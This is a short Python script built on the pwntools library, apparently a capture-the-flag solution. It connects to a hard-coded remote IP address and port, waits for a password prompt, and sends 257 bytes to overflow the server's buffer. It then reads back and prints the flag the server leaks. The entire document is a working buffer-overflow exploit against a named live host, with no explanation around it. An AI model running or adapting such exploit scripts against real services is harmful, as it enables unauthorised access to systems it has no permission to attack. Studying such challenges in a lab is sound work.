from pwn import *

conn = remote('140.113.207.245', 30170)

conn.recvuntil(b'Type Your Password: ')

payload = "c" * 257 # 257 bytes, larger than the server's buffer
conn.sendline(payload.encode())
conn.recvuntil(b'You have such bad password, we decide to give you a hint for creating your password!\n')
flag = conn.recvline().decode('ascii')
print(flag)
